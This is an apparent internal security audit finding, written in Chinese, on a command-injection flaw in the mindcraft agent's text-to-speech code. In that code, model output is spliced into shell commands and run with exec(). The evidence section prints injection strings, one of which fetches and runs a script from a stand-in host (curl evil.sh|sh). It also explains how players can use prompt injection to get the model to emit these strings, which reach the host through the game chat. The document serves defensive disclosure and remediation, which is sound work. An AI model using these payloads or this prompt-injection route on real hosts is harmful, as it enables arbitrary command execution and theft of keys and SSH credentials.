id: F-EXEC-201
severity: high
class: injection
file: mindcraft/src/agent/speak.js:110
evidence: |
  **命令注入：模型输出 → 拼进 PowerShell/espeak 命令行 → exec()（走 shell）。**

  完整调用链（每一跳都亲手核过）：

  1. 入口：玩家聊天 → `src/agent/agent.js:handleMessage` → 交给 LLM（`prompter.prompt*`）。
     玩家能通过聊天诱导模型输出任意文本（prompt injection），这条不需要任何特权。
  2. `agent.js:712 async openChat(message)`：
     ```js
     let to_translate = message;               // = 模型这一轮的回复全文
     ...
     if (settings.speak) speak(to_translate, this.prompter.profile.speak_model);   // :747
     ```
  3. `src/agent/speak.js:31 export function speak(text, speak_model)` → 入队 → `processQueue()`。
  4. `speak.js:99-110`（危险 sink）：
     ```js
     const cmd = isWin
        ? `powershell -NoProfile -Command "Add-Type -AssemblyName System.Speech; \
           $s=...; $s.Speak('${txt.replace(/'/g,"''")}'); $s.Dispose()"`
        : isMac ? `say "${txt.replace(/"/g,'\\"')}"`
                : `espeak "${txt.replace(/"/g,'\\"')}"`;
     exec(cmd, err => { ... });               // exec = 走 cmd.exe / sh
     ```
     转义只处理了单引号（Windows）/双引号（mac & linux）。

  实测构造（只打印生成的命令行，**未执行**）：
  ```
  输入 txt = hi"; & echo PWNED & rem "
  → powershell -NoProfile -Command "Add-Type ...; $s.Speak('hi"; & echo PWNED & rem "'); $s.Dispose()"
      单引号被 '' 正确转义，但双引号没转义 ⇒ 它提前关掉了 cmd.exe 的 "..." 段，
      后面的 `& echo PWNED &` 变成 cmd 级的第二条命令。
  输入 txt = hi"; $(curl evil.sh|sh); echo "x     （mac/linux）
  → say "hi\"; $(curl evil.sh|sh); echo \"x"
      双引号被转义了，但双引号内的 `$( )` 仍由 sh 解释 ⇒ 命令替换照常执行。
  ```

  闸门现状（这是定级依据，不是替它开脱）：
  - `settings.js:26 "speak": false` —— **默认关闭**；
  - 但 `speak` 在 `src/mindcraft/auth_gate.js` 的 `SAFE_RUNTIME_SETTINGS` 白名单里
    （第 140 行附近的 `'speak'`），而 `src/mindcraft/public/settings_spec.json:49` 也有它
    ⇒ **面板/任何持 token 的 socket 客户端可在运行期把它改成 true**，不需要改文件重启；
  - `inspectChatText`（`permissions.js:310`）只拦"以 / 开头的行"，对 `"`、`$()`、`` ` ``、`&`
    **完全不拦** —— 它守的是斜杠命令，不是 shell。
exploitability: |
  前置条件（按难度排序）：
  A) 最高危组合：用户开了 TTS（`speak: true`，面板上有开关，且 `speak_model` 留空 → 走 `system` 分支）。
     此时**任何一个能说话的玩家**（`only_chat_with` 为空时 `src/agent/agent.js` 里任何人都会被听）
     发一句诱导性聊天，让模型复述形如 `" & <cmd> & "` 的字符串，即可在**宿主机**上执行命令。
  B) 若攻击者已经能连 mindserver（本地进程、或拿到 F-SEC-205 落盘的 token），可直接
     `set-agent-settings {speak:true}` 再触发 A，无需用户操作。
  能拿到什么：**宿主机任意命令执行**（当前用户权限）。可直接读 `keys.json`（D2 的 F-SEC-201，
  那把 key 就在同一台机上）、读 `.ssh`、装持久化、连本机 MC server 的 RCON。
  这是本项目里"从游戏内聊天到本机 root"的完整通路之一，且不需要 `allow_insecure_coding`。
  拿不到什么：跨用户提权（不是 root/Administrator 提升）；需要模型配合输出恶意串。
  影响半径：整台主机。与 D1 的 F-DEP-004（postinstall 执行面）同属"本机执行"级别。
suggested_fix: |
  **首选：不要拼 shell 命令，改成参数数组 + 不复用 shell 的 spawn。** 三处一起改（speak.js:99-110）：
  ```js
  if (isWin) {
      // 文本走 stdin/base64，绝不进命令行
      const ps = 'Add-Type -AssemblyName System.Speech;' +
                 '$s=New-Object System.Speech.Synthesis.SpeechSynthesizer;$s.Rate=2;' +
                 '$t=[Console]::In.ReadToEnd();$s.Speak($t);$s.Dispose()';
      const child = spawn('powershell', ['-NoProfile', '-NonInteractive', '-Command', ps],
                          { windowsHide: true, stdio: ['pipe', 'ignore', 'ignore'] });
      child.stdin.end(txt);
  } else {
      const bin  = isMac ? 'say' : 'espeak';
      const args = isMac ? ['-'] : ['--stdin'];      // 都从 stdin 读，不进 argv
      const child = spawn(bin, args, { stdio: ['pipe', 'ignore', 'ignore'] });
      child.stdin.end(txt);
  }
  ```
  要点：① `exec` → `spawn`；② 文本一律走 **stdin**（PowerShell 用 `[Console]::In.ReadToEnd()`，
  `say` 用 `-`，`espeak` 用 `--stdin`），彻底消除"文本进命令行"这个前提；
  ③ 顺带加长度上限（如 500 字）与 `child.on('error')` 处理。
  若坚持保留命令行方式（不推荐），至少：Windows 侧要 `txt.replace(/[`"]/g, ...)` 且改成
  `-EncodedCommand`（base64，天然无转义问题）；POSIX 侧必须用 `'...'` 且把 `'` 转成 `'\''`。
  **另一条独立加固**：把 `speak` 从 `SAFE_RUNTIME_SETTINGS` 里去掉（它是"打开宿主机行为"的开关，
  不该允许远程运行期打开），或者对它的开启加一条显式二次确认。
verify: |
  cd mindcraft
  # 1) 静态：speak.js 里不再有 exec( 和把 txt 拼进命令串
  grep -nE "exec\(|\\\$\{txt|\\\$\{txt\.replace" src/agent/speak.js && echo "FAIL 仍有拼接" || echo "OK 无拼接"
  # 2) 动态（关键）：注入串必须原样被"朗读"而不是被执行
  node -e '
    import("./src/agent/speak.js").then(async ({speak}) => {
      const marker = "/tmp/speak-pwn-" + Date.now();
      speak(`hi"; & touch ${marker} & rem "`, "system");
      await new Promise(r => setTimeout(r, 4000));
      const fs = await import("fs");
      console.log(fs.existsSync(marker) ? "FAIL 被注入执行了" : "OK 未执行（被当文本朗读）");
    });
  '
  # 3) 正向对照：正常中文仍然能播（别为了安全把功能弄哑）
  node -e 'import("./src/agent/speak.js").then(({speak})=>speak("测试一句话","system"))'
  # 4) 门禁不回归
  npm run gate:full
discovered_by: recon-scout
dept: D3-EXEC
